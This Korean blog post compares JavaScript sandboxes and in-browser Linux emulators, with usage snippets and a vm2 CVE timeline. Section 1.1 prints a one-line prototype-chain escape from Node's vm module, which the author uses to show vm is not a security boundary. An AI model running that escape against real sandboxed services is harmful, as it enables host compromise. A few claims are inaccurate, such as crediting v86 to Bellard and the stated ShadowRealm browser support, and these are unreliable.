---
itle: JavaScript Linux 커널 시뮬레이션 솔루션 비교
description: JavaScript/TypeScript로 Linux 환경을 재현하는 방법에 대한 심층 분석
date: 2026-05-28authors:
  - fox3000foxy
tags:
  - javascript
  - linux
  - analysis
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEQcreZmmVx1U8zFHwsD+JTDIUKtMP5RYijaEkOIqZVfXIKA/i3h0lslw+ZgUBlLXKW3OVA2tGM8svcJWTXDxS8A=="
author_sig: "3jmuB22bN4lTQMIEt8cJnJXiAcJhd5kcgUe0mgKXa67wLFVJ0De1lBgAYS2JYdSZvPHTs36CakNMrtE2V0icqQ=="
---

# 모든 JavaScript 샌드박스, 에뮬레이터, 시뮬레이터, 허니팟 비교

그래서 나는 한동안 이 토끼굴에 완전히 빠져 있었어. [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) -- Fortune의 프로젝트 (그녀에 대해선 나중에 더 얘기할게) -- 를 도와주다 보니, 계속 "잠만, 이거 `v86`이랑 뭐가 다른데?" 또는 "그냥 `vm2` 쓰면 안 돼?"라는 질문을 받게 됐어. 그리고 나는 생태계 전체를 먼저 매핑하지 않고는 깔끔한 답변을 할 수 없겠다는 걸 깨달았지. 그래서 여기까지 왔어 lol.

알고 보니 네 가지 뚜렷한 계열이 있어 -- JS 샌드박스, Linux 에뮬레이터, Linux 시뮬레이터, 허니팟 -- 그리고 이들은 거의 겹치지 않는데, 항상 같은 맥락에서 언급되더라. 플러그인 시스템을 만드는 사람은 `isolated-vm`을 찾고, CLI 도구를 데모하는 사람은 `v86`을 찾고, SSH 위협 인텔리전스를 하는 사람은 Cowrie를 찾아. "코드를 상자 안에서 실행한다"는 모호한 우산 아래에서 완전히 다른 문제를 해결하고 있어.

이 글을 쓰기 위해 소스 코드, CVE 보고서, 아키텍처 문서, npm 페이지를 읽는 데 엄청난 시간을 썼어. 엄청 길 거야 -- 진짜 커피 한 잔 해. 아니면 두 잔.

> 빠른 면책: `typescript-virtual-container`가 이 글에서 많이 등장하는데, 이 연구를 촉발했기 때문이야. 다른 것들에도 공정하게 쓰려고 노력했지만, 그 맥락을 염두에 둬 줘.

---

## 파트 0 -- 먼저, 너는 어떤 문제를 해결하려는 거야?

들어가기 전에, 각 계열이 무엇을 위한 것인지 정확히 아는 게 중요해. 용어가 쉽게 헷갈리거든 (내가 직접 앉아서 매핑하기 전에는 나도 포함해서).

**JS 샌드박스**는 JavaScript 코드를 호스트 Node.js 프로세스로부터 격리시켜. 위협 모델은: `process.exit()`를 호출하거나, 파일을 읽거나, 자식 프로세스를 생성할 수 있는 신뢰할 수 없는 JS 코드야. 해결책은 V8 실행 경계야. 이 도구들은 Linux 셸, 권한이 있는 파일시스템, SSH 같은 개념이 없어.

**Linux 에뮬레이터**는 수정되지 않은 실제 Linux 커널을 CPU 에뮬레이터(x86, RISC-V, OR1K) 안에서 실행해. 진짜 OS를 부팅해. 진짜 시스템 콜을 얻어. x86으로 컴파일된 프로그램과 바이너리 호환성이 있어. 오버헤드는 엄청나.

**Linux 시뮬레이터**는 실제 커널을 실행하지 않고 Linux 시스템의 *동작*을 가짜로 구현해. 셸 인터프리터, 가상 파일시스템, 그리고 프로그램과 사람을 속일 만큼의 Unix 의미론을 구현해. 커널 없음. Wasm 없음. CPU 에뮬레이션 없음. 훨씬 낮은 오버헤드.

**허니팟**은 공격자를 유인하고 그들이 하는 일을 기록하기 위해 만들어졌어. 주로 실행 환경이 아니라 관측 도구야. 실제 Linux 동작에 대한 충실도는 공격자가 함정을 감지하지 못하게 하는 데까지만 중요해.

이 프레임워크로, 이 글의 모든 프로젝트가 여기에 해당해:

```
JS 샌드박스:        vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Linux 에뮬레이터:    v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Linux 시뮬레이터:   typescript-virtual-container (이 공간에서 유일함)
허니팟:          Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
터미널 스택:    xterm.js + node-pty (격리 도구는 아니지만 인접함)
```

---

## 파트 1 -- JavaScript 샌드박스

### 1.1 `vm` -- Node.js 내장 (네 생각만큼 안전하지 않아)

Node에서 "신뢰할 수 없는 JS를 실행"하는 가장 오래된 답변은 내장 `vm` 모듈이야. v0.1부터 있었어서 많은 사람들이 먼저 찾는데 -- 그리고 나서 당하지.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

`vm`이 실제로 하는 일: 새로운 V8 컨텍스트(새로운 빌트인 생성자 세트 -- `Object`, `Array`, `Function` 등)를 만들고 그 안에서 코드를 실행해, `sandbox`에 넣은 모든 것에 대한 공유 참조를 가져. V8 엔진은 변하지 않아. 프로세스도 변하지 않아. 메모리는 공유돼.

`vm`이 보안을 제공하지 않는 이유: JavaScript의 프로토타입 체인은 모든 것을 `Object.prototype`에 연결하는 DAG야. 호스트 영역의 어떤 객체든 샌드박스에 넣으면, 게스트는 프로토타입 체인을 타고 올라가 호스트 생성자에 도달할 수 있어. `Function`에서 `Function("return process")()`를 호출하면 실제 `process` 객체를 되찾을 수 있어. 게임 오버. 바로 끝이야.

```js
// 이건 vm에서 아주 잘 실행돼 -- 실제 process 객체를 되찾아와
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

그러니까, Node.js 문서 자체에서 말하길: "vm 모듈은 보안 메커니즘이 아닙니다. 신뢰할 수 없는 코드를 실행하는 데 사용하지 마세요." 이 경고는 영원히 있었어. 사람들은 계속 무시해. 프로덕션 앱에서 `vm`을 샌드박스로 사용하는 걸 본 적 있어. 제발 그러지 마 xD

**평결**: 샌드박스가 아니라 스코프 메커니즘이야. 격리된 변수 스코프가 필요할 때 사용해 (템플릿 엔진, 코드를 제어하는 `eval` 같은 기능). 절대 신뢰할 수 없는 입력에 사용하지 마.

**메모리**: 무시할 만한 오버헤드 -- 호스트 프로세스와 같은 V8 힙.
**보안**: 동기 있는 공격자에게는 없음.

---

### 1.2 `vm2` -- 커뮤니티의 시도, 그리고 아주 긴 죽음

`vm2`는 `vm`의 탈출 문제에 대한 커뮤니티의 답변이었어. 핵심 아이디어: 샌드박스 경계를 넘는 모든 객체를 `Proxy`로 감싸서 속성 접근을 가로채고, 프로토타입 클라이밍을 막고, 위험한 참조를 걸러내. 이론상 영리한 아이디어야! 실제로는 별로 안 통했어, 곧 알게 되겠지만.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // VMError 발생, process에 접근 불가
```

몇 년 동안 이건 꽤 잘 작동했어. 하지만 JavaScript `Proxy`의 공격 표면은 엄청나. 모든 새로운 JS 언어 기능 -- 제너레이터, 비동기 이터레이터, `Symbol.toPrimitive`, `Error.prepareStackTrace`, `Promise` 내부 슬롯 -- 은 잠재적 우회 벡터야.

CVE 타임라인은... 정말 대단해. 이걸 봐:

| 날짜 | CVE | 메커니즘 |
|------|-----|-----------|
| 2022년 10월 | CVE-2022-36067 | `Error.prepareStackTrace` 호스트 컨텍스트 탈출 |
| 2023년 4월 | CVE-2023-29017 | 처리되지 않은 비동기 에러 스택 호스트 객체 누출 |
| 2023년 4월 | CVE-2023-29199 | `handleException()`을 통한 예외 살균 우회 |
| 2023년 4월 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| 2023년 5월 | CVE-2023-32314 | `Error.name`의 `Proxy` → `Function` → RCE |
| 2023년 7월 | CVE-2023-37466 | 비동기 함수 + 스택 오버플로우 + `Proxy.getPrototypeOf` |
| 2023년 7월 | CVE-2023-37903 | Worker 스레드 + eval 탈출 |

같은 달(2023년 4월)에 세 개의 치명적 CVE. 한 달에 세 개. CVE-2023-37903 이후, 유지보수자는 공식적으로 라이브러리를 더 이상 사용하지 말라고 선언하면서 *"이 라이브러리는 치명적인 보안 문제를 포함하고 있으며 프로덕션에 사용해서는 안 됩니다."* 라고 메시지를 남겼어.

유지보수자는 2025년 10월에 버전 3.10.0으로 부활시켰고, 당시 알려진 모든 것을 고쳤다고 주장했어. 2026년 1월에 새로운 치명적 탈출(CVE-2026-22709, CVSS 9.8)이 공개되었고, 2026년 5월에는 11개가 더 이어졌어. 열하나. 패턴은 변하지 않았고 솔직히 앞으로도 변하지 않을 거야.

근본적인 문제는 아키텍처적이야 -- 그리고 이게 생태계 전체가 배우는 데 오래 걸린 교훈이야. 샌드박스하는 것과 같은 언어로, 같은 엔진으로, 같은 프로세스 안에서 안전한 샌드박스를 만들 수 없어. 탈출 표면은 전체 V8 구현인데 -- V8은 수백만 줄의 C++로 계속 변하고 있어. 모든 새로운 JS 기능이 잠재적으로 새로운 공격 경로를 열어.

**평결**: 보안에 민감한 애플리케이션에는 사용하지 마. 최신 버전에서도 몇 달마다 새로운 우회가 발견돼. 유지보수자 자신도 공개적으로 인정했어.

---

### 1.3 `isolated-vm` -- 실제로 작동하는 것

`isolated-vm`은 올바른 접근 방식을 취해: V8 자체의 격리 프리미티브인 Isolate를 사용해. 각 V8 Isolate는 자신의 힙, 자신의 가비지 컬렉터, 자신의 빌트인 세트를 가지고 있고, 다른 Isolate와 공유 참조가 전혀 없어.

이것은 Chrome이 탭 사이에 사용하는 것과 같은 경계야. 언어 수준의 Proxy 트릭이 아닌 진짜 보안 경계지.

```js
import ivm from "isolated-vm";

// 각 isolate는 자체 V8 힙
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB 제한
const context = await isolate.createContext();
const jail = context.global;

// 경계를 넘어 데이터 전달하려면 명시적 직렬화가 필요해
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // 호스트 프로세스, 호스트 힙, 호스트 모듈에 접근 불가
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// 타임아웃이나 메모리 제한으로 하드 종료 가능
isolate.dispose(); // 전체 힙 해제
```

`Reference`와 `ExternalCopy` 타입이 명시적 통신 브리지야. `Reference`는 isolate에 호스트 함수에 대한 호출 가능한 핸들을 줘 -- isolate는 호출할 수 있지만 클로저나 프로토타입은 검사할 수 없어. `ExternalCopy`는 값을 힙 경계를 넘어 직렬화(구조적 클론)해. 이 명시적 브리지 모델은 편리하지는 않지만, 격리를 실제로 만들어내는 거야.

하드 리소스 제한을 설정할 수 있어: 메모리(제한 초과 시 isolate 종료), 벽시계 타임아웃, CPU 타임아웃. 종료는 실제야 -- `while(true)`로 우회할 수 있는 JS 타임아웃이 아니라, V8 Isolate 전체를 죽여.

**한계**: JS 전용이야. 내부에서 bash를 실행할 수 없어. 파일, 권한, 네트워크, 프로세스 개념이 없어. 사용자 제출 JS(플러그인, 공식, 스크립트 훅)에는 정확히 맞는 도구이고, 다른 모든 것에는 틀린 도구야. `typescript-virtual-container`의 작성자가 초기에 고려했다가 "셸 명령 실행"과 "JavaScript 격리"가 근본적으로 다른 문제라는 걸 깨달았다고 언급했어.

**메모리**: 빈 isolate당 ~3–10 MB, 힙 사용에 따라 증가.
**보안**: 강력. V8 Isolate 경계가 실제 격리 프리미티브야.
**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)
**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` -- Wasm으로 컴파일된 별도의 JS 엔진

다른 접근 방식: V8 내에서 격리하는 대신, WebAssembly로 컴파일된 완전히 별도의 JavaScript 엔진을 실행해. 호스트는 V8/Node에서 실행돼. 게스트는 QuickJS-내부-Wasm에서 실행돼. Wasm 샌드박스가 격리 경계를 제공해.

QuickJS는 Fabrice Bellard의 또 다른 작품이야 (QEMU, FFmpeg, JSLinux, TinyEMU의 그 사람 -- 이 사람은 진짜가 아니야, 어떻게 한 사람이 이걸 다 하지?). C로 작성된 작고 스펙 준수하는 ES2023 JS 엔진이고, Wasm으로 컴파일하면 ~500 KB밖에 안 돼.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // QuickJS에서 실행, V8과 완전히 분리
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS는 C로 작성된 작고 스펙 준수하는 ES2023 JavaScript 엔진이야. Wasm으로 컴파일하면 동기 변형은 ~500 KB, 비동기(Asyncify) 변형은 ~1 MB. 메모리 관리는 수동이야 -- VM에서 추출한 모든 값을 명시적으로 폐기해야 해, 좀 귀찮지만 경계 간 GC 문제를 방지해. 재미있는 트레이드오프지!

`@sebastianwessel/quickjs` 래퍼는 더 인체공학적인 API를 추가하고, 선택적 가상 파일시스템, fetch 지원, Node.js 모듈 스텁을 제공해:

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

보안 모델은 `isolated-vm`과 달라: Wasm의 선형 메모리 모델은 게스트가 V8 힙 객체에 직접 접근할 수 없다는 뜻이야. 공격 표면은 호스트↔Wasm 인터페이스(imports/exports)지, 전체 JS 언어가 아니야. 이 방법은 일반적으로 Proxy 기반 샌드박싱보다 더 강력하다고 여겨져.

문제: QuickJS는 V8과 같은 최적화 수준이 아니야. CPU 바인딩 JS 워크로드에서는 V8보다 5–20배 느려. 짧은 스니펫과 신뢰할 수 없는 eval에서는 보통 문제되지 않아.

**메모리**: 인스턴스당 ~500 KB Wasm 모듈 + 힙.
**보안**: Wasm 경계, Proxy 기반 접근 방식보다 더 강력하다고 여겨짐.
**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno -- 권한 우선 런타임

Deno는 완전히 다른 철학을 취해: Node 내에서 샌드박싱하는 대신, 기본적으로 안전한 새 런타임을 만들어. 나는 이 접근 방식이 정말 마음에 들어 -- 솔직히 Node.js가 처음부터 그랬어야 했어. Ryan Dahl(원래 Node.js 창시자)은 말 그대로 몇 가지 Node.js 디자인 결정을 후회해서 Deno를 만들었어. 생각해보면 꽤 놀라운 일이야.

모든 민감한 기능(파일 읽기, 파일 쓰기, 네트워크, 환경 변수, 서브프로세스)에는 명시적인 `--allow-*` 플래그가 필요해:

```bash
# 이건 /data에서만 읽을 수 있어
deno run --allow-read=/data script.ts

# 이건 하나의 도메인만 가져올 수 있어
deno run --allow-net=api.example.com script.ts

# 플래그 없음 = 아무 권한 없음
deno run untrusted.ts # 읽기, 쓰기, 네트워크, spawn 불가
```

권한 모델은 Rust/OS 수준에서 구현돼 -- JS 트릭이 아니야. Deno 코드가 `Deno.readFile()`을 호출하면, Rust op를 통해 권한 테이블을 확인한 후에야 파일시스템에 접근해. 권한이 부여되지 않으면 시스템 콜이 아예 발생하지 않기 때문에 JS에서 우회할 수 없어.

진짜 신뢰할 수 없는 코드를 실행하려면, Deno Workers(웹 워커)가 같은 프로세스 내에서 두 번째 isolate를 제공하고, 각각 자체 권한 세트를 가져. 권한이 0인 워커를 생성하고 `postMessage`로 통신할 수 있어.

Deno 2(2024년 10월 출시)는 완전한 npm 호환성과 Node.js 호환성 심을 추가해서 서버 측 사용 사례에서 채택을 크게 개선했어.

**트레이드오프**: Deno의 보안 모델은 부분적으로 신뢰할 수 있는 코드에 탁월해. 완전히 신뢰할 수 없고 적대적일 수 있는 코드의 경우, 권한 모델만으로는 충분하지 않아 -- Isolate 경계(`isolated-vm`)나 다른 엔진(`quickjs-emscripten`)이 필요해. Deno도 여전히 V8을 실행하고 정교한 공격자는 V8 수준의 버그를 찾을 수 있기 때문이야.

---

### 1.6 TC39 ShadowRealm -- 표준 답변 (언젠가는)

JavaScript 표준 기구(TC39)는 ShadowRealm이라는 제안을 가지고 있어서 `vm`과 `vm2`가 하려고 했던 것을 표준화하려고 하지만, 올바른 보안 모델을 가져. ShadowRealm은 자체 인트린직을 가진 격리된 JS 실행 컨텍스트를 만들고, 외부 영역에 접근할 수 없으며, 신중하게 제어된 import/export 인터페이스를 가져.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // 별도의 인트린직, 외부 영역에 접근 불가
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm은 브라우저에(Chrome 90+, Firefox 105+) 있지만 2026년 현재 Node.js stable에는 아직 없어. TC39 Compartments 제안이 모듈 수준 격리를 위해 그 위에 구축되고 있어. 이게 장기적으로 표준화된 답변이지만, 서버 측 Node 사용 사례에서는 아직 프로덕션 준비가 안 됐어. 멀리서 오는 게 보이지만 아직... 도착하지 않은 것들 중 하나야. 전형적인 TC39 xD

---

### 샌드박스 계열 요약

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **격리 경계** | 없음 (스코프만) | Proxy (깨짐) | V8 Isolate | Wasm | V8 Isolate + Rust 권한 |
| **메모리 제한** | ❌ | ❌ | ✅ 하드 제한 | ✅ Wasm 힙 | 부분적 |
| **CPU 타임아웃** | ❌ | ✅ (우회 가능) | ✅ 하드 | ✅ | ✅ |
| **보안** | 없음 | 깨짐 | 강력 | 강력 | 강력 |
| **JS 속도** | 네이티브 V8 | 네이티브 V8 | 네이티브 V8 | ~10배 느림 | 네이티브 V8 |
| **브라우저** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Node 호환** | 네이티브 | ✅ | ✅ | 부분적 심 | 부분적 |
| **상태** | 안정 | 위험 (새 CVE) | ✅ 활동 중 | ✅ 활동 중 | ✅ 활동 중 |
| **RAM 오버헤드** | ~1 MB | ~5–20 MB | ~3–10 MB | ~5–15 MB | ~10–30 MB |

핵심: 보안을 중요하게 생각한다면, 실제로 두 가지 옵션만 있어 -- `isolated-vm` (네이티브 애드온, V8 Isolate, 전체 JS 속도)과 `quickjs-emscripten` (Wasm, 브라우저 호환, 계산 집약적 코드에서 ~10배 느림). 나머지는 "제발 쓰지 마"(`vm`, `vm2`)거나 완전히 다른 문제를 해결하는 런타임(Deno)이야. ShadowRealm이 언젠가 이 그림을 바꿀 수도 있지만, 아직은 아니야.

---

## 파트 2 -- JavaScript의 Linux 에뮬레이터

여기서부터 진짜 흥미로워지기 시작해. 이것들은 *진짜* 에뮬레이터야 -- JavaScript나 WebAssembly로 CPU 명령어 세트를 구현하고, 실제 Linux 커널 이미지를 부팅하고, 실제 사용자 공간 바이너리를 실행해. 격리는 게스트와 호스트가 아무것도 공유하지 않는다는 점에서 온다: 다른 메모리 공간, 다른 명령어 스트림.

지불하는 비용은 엄청나지만, 얻는 것은 진정으로 놀라워: 실제 Linux가, 실제로, 브라우저나 Node 프로세스 안에서 실행돼. 생각해보면 꽤 정신없지 않아?

### 2.1 `v86` -- JS + Wasm JIT의 x86 PC 에뮬레이터

Fabrice의 `v86` (GitHub의 copy)은 JavaScript에서 가장 강력한 오픈 소스 x86 에뮬레이터야. 2013년경 순수 JS 인터프리터로 시작해서 x86 기본 블록을 즉시 WebAssembly로 변환하는 JIT 컴파일 시스템으로 진화했어, 성능이 극적으로 향상됐지.

에뮬레이트하는 것:
- **CPU**: x86-32 (IA-32), 명령어 세트는 대략 Pentium 1 수준. 64비트(x86-64) 지원 없음 -- 이건 빠진 기능이 아니라 하드 아키텍처적 한계야.
- **FPU**: JavaScript의 `Float64Array`를 통해. x87은 80비트 확장 정밀도; JS 더블은 64비트. 이건 부동소수점 결과가 실제 CPU와 약간 다를 수 있다는 뜻이야.
- **메모리**: 설정 가능, JS 힙의 `SharedArrayBuffer` 또는 `ArrayBuffer`에 매핑.
- **하드웨어**: 8254 PIT (타이머), 8259 PIC (인터럽트 컨트롤러), 8042 키보드 컨트롤러 (PS/2), CMOS RTC, SVGA 확장 및 Bochs VBE가 있는 VGA, IDE 컨트롤러, 플로피 컨트롤러 (8272A), NE2000 네트워크 카드.
- **BIOS**: SeaBIOS 사용 (오픈 소스 x86 BIOS).

JIT는 기본 블록(점프 없는 x86 명령어 시퀀스)을 식별하고, WebAssembly 함수로 변환하고, 그 함수를 캐시하고, 같은 블록의 후속 실행에서 호출함으로써 작동해. 뜨거운 코드 경로는 네이티브 Wasm 성능을 얻어. 차가운 경로는 JS 인터프리터로 폴백돼.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// 시리얼 출력 캡처 (Linux 커널 콘솔)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// 게스트에 입력 보내기 (셸에 입력)
emulator.serial0_send("ls /\n");
```

**지원 OS**: Alpine Linux (훌륭함), Ubuntu 16.04/18.04 (i386만), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (제약 있음), MS-DOS.

**부팅 시간**: 클린 이미지에서 Alpine Linux 15–40초. 이건 실제 커널 초기화에 내재된 거야 -- 건너뛸 수 없어. 네, 사용자들은 브라우저에서 커널 부팅 시퀀스를 지켜보고 앉아 있어야 해. 그게 조건이야 xD

**메모리**: 인스턴스당 100–256 MB. 바쁜 Linux 인스턴스의 경우 Wasm JIT 코드 캐시만 수십 MB에 도달할 수 있어.

**Node.js 사용**: 완전 지원. DOM 불필요 -- 시리얼만 필요하면 VGA 출력은 버려도 돼.

**할 수 없는 것**: 64비트 바이너리 실행, 최신 커널 기능(eBPF, io_uring 등) 사용, 메모리 제한에 부딪히지 않고 동시에 소수 인스턴스 이상 실행.

**npm**: [v86](https://www.npmjs.com/package/v86) -- 지속적으로 업데이트, 작성 시점 기준 최근 1일 이내에 최신 버전 게시됨.
**GitHub**: [copy/v86](https://github.com/copy/v86)
**데모**: [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux와 TinyEMU -- Bellard의 작업, 두 번

JSLinux는 Fabrice Bellard 자신의 JavaScript Linux 에뮬레이터야 -- 최초로, 2011년에 발표됐어. 이 글에서 계속 Bellard를 언급하는 이유는 계속 나타나거든: QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. 이 사람은 정말 대단해. 과장 없이 소프트웨어 역사상 가장 인상적인 솔로 기술 기여 중 하나야.

원래 JSLinux는 순수 JS x86 인터프리터였어. 2016년에 Bellard가 TinyEMU(C로 작성된 RISC-V 에뮬레이터)를 작성하고 Emscripten으로 JavaScript로 컴파일했고, 그게 현재 JSLinux의 기초가 됐어. 그래서 현재 JSLinux는 실제로 JavaScript를 생성하는 C 코드야 -- 손으로 작성된 JS가 전혀 아니야.

Bellard 사이트의 기술 노트는 읽을 가치가 있어: 현재 JSLinux는 32 또는 64비트 RISC-V CPU(x86이 아님)를 실행하고, VirtIO 콘솔, VirtIO 네트워크, VirtIO 블록 디바이스, 호스트와 파일 공유를 위한 9P 파일시스템을 에뮬레이트해. JS 데모는 C를 Emscripten으로 컴파일한 거야 -- 손으로 작성된 JS가 아니야.

TinyEMU 자체는 지원:
- RISC-V RV32IMAFDQC 및 RV64IMAFDQC (32 및 64비트, 부동소수점, 곱셈, 압축 명령어 포함)
- KVM을 통한 x86 (네이티브 전용, 에뮬레이션 없음 -- 그래서 JS 버전은 RISC-V 전용)
- VirtIO 콘솔, 네트워크, 블록, 입력, 9P 파일시스템

TinyEMU는 Emscripten을 통해 제공되는 JavaScript 데모가 있어. JSLinux의 기반이고 `container2wasm`에서도 사용돼 (섹션 2.5 참조).

**JSLinux 상태**: npm 패키지 없음, 프로그래밍 API 없음. 브라우저에서 여는 데모야. 역사적 의의는 높아 -- 개념을 증명했지. 라이브러리로서의 실용적 사용: 없음.

**TinyEMU**: npm에 없음, C 소스는 [bellard.org/tinyemu](https://bellard.org/tinyemu/)에서 가능.

---

### 2.3 jor1k -- OR1K 에뮬레이터

jor1k는 Sebastian Macke가 JavaScript로 작성한 OpenRISC 1000 (OR1K) 에뮬레이터야. 역사적으로 jor1k가 VirtIO 9P 파일시스템 지원을 도입했고, Bellard가 나중에 TinyEMU와 JSLinux에 통합했기 때문에 흥미로워. 이 프로젝트들 간의 교차 수분은 긴밀해 -- 모두 서로에게서 차용해. 오픈 소스 에뮬레이션 작업에서 가장 멋진 점 중 하나야.

**상태**: 더 이상 적극적으로 유지보수되지 않음, npm 패키지 없음. 지금은 보관됨. 주로 역사적 맥락으로 알아두면 좋아 -- 누군가 jor1k를 언급하면, 뭔지 알게 되는 거지 :)

---

### 2.4 CheerpX -- 브라우저용 상용 x86 에뮬레이터

Leaning Technologies의 CheerpX는 상용 프로덕션 등급 x86 Linux 에뮬레이터야. 오픈 소스가 아니지만, 실제 Debian/Ubuntu 사용자 공간을 실행하는 데 v86보다 훨씬 강력해. 브라우저에서 실제 VSCode가 필요하다면 이걸 찾아.

v86과의 주요 차이점:
- 더 넓은 ISA 지원 (더 많은 x86 확장, 더 나은 glibc 호환성)
- 브라우저의 IndexedDB 기반 파일시스템 (페이지 로드 간 지속)
- `SharedArrayBuffer`를 통한 pthread 지원 (COOP/COEP 헤더 필요 -- 네 그 성가신 보안 헤더)
- 최소 OS 이미지가 아닌 VSCode, Python, Node.js 및 기타 실제 애플리케이션 실행용으로 설계됨
- 전문 지원 및 SLA 사용 가능 (깨지면 누군가에게 소리칠 수 있음)

일반적인 사용 사례는 "서버 없이 브라우저에서 실제 Linux 애플리케이션 실행"이야. 회사들은 브라우저 기반 IDE, 코딩 튜토리얼, 대화형 문서에 사용해.

```js
// CheerpX API (간소화)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Node.js 스토리**: CheerpX는 브라우저 우선이야. 기본 에뮬레이터는 이론적으로 Node에서 작동할 수 있지만(Wasm이니까), API와 문서는 전적으로 브라우저 사용에 맞춰져 있어. 서버 측 사용은 지원되지 않아.

**메모리**: v86과 비슷 -- 실제 Debian 인스턴스의 경우 200+ MB.
**가격**: 오픈 소스 프로젝트에는 무료, 프로덕션 SaaS에는 상용 라이선스.
**문서**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz) -- Wasm의 Node.js, Linux 에뮬레이션이 아님

WebContainers는 종종 Linux 에뮬레이터와 함께 묶이지만 아키텍처가 달라. x86을 에뮬레이트하지 않아. Linux를 부팅하지 않아. WASI를 사용해 WebAssembly로 컴파일된 Node.js를 실행해. 이 차이는 중요하고 나도 한동안 혼란스러웠어 lol.

혼란은 마케팅에서 오는 것 같아 -- "브라우저에서 Node.js 실행"은 에뮬레이션처럼 들리지만, 실제로는 VM 안에서 Node.js를 실행하는 Linux 에뮬레이션이 아니라 Node.js 자체가 Wasm으로 컴파일된 거야. 완전히 다른 거야.

아키텍처:
1. Node.js가 Wasm으로 컴파일됨 (특히 커스텀 WASI 런타임)
2. Service Worker가 에뮬레이트된 Node.js 서버의 네트워크 요청을 가로채서 브라우저 탭으로 라우팅
3. 파일시스템은 브라우저 메모리에 있음 (디스크 I/O 없음)
4. npm은 브라우저 내 사용에 최적화된 커스텀 구현

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// 파일 쓰기
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Node.js 명령 실행
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

실제 Node.js(Wasm 컴파일)를 실행하기 때문에, 실제 npm, 실제 Node.js API, 실제 모듈 해석을 얻어. 일반적인 Linux 사용자 공간은 얻지 못해 -- `apt`로 시스템 패키지를 설치하거나, 임의의 컴파일된 바이너리를 실행하거나, Node.js 생태계 밖에서 많은 것을 할 수 없어.

**브라우저 요구 사항**: SharedArrayBuffer (COOP/COEP 헤더 필요), Service Worker 지원, 최신 Wasm.

**Node.js 스토리**: 브라우저 전용으로 설계됨. API는 브라우저 컨텍스트 밖에서는 작동하지 않아.

**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
**문서**: [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm -- Wasm으로 컴파일된 Docker 컨테이너

`container2wasm`은 Docker 컨테이너 이미지를 가져와서 모든 Wasm 호스트(브라우저 포함)에서 실행할 수 있는 WebAssembly 바이너리로 변환하는 도구야 (npm 패키지가 아님). 처음 봤을 때 진짜 작동한다고 믿기지 않았어.

메커니즘:
- x86_64 컨테이너: Bochs(x86 에뮬레이터, Wasm으로 컴파일됨) + 컨테이너의 루트 파일시스템 내장
- riscv64 컨테이너: TinyEMU (또 Bellard야!) + 컨테이너의 루트 파일시스템 내장
- 결과 `.wasm` 파일이 에뮬레이터를 부팅하고, 컨테이너 파일시스템을 마운트하고, 컨테이너의 진입점을 실행해

```bash
# Ubuntu 22.04 컨테이너를 Wasm으로 변환
c2w ubuntu:22.04 out.wasm

# 실행
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# 또는 브라우저 사용을 위해 제공
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

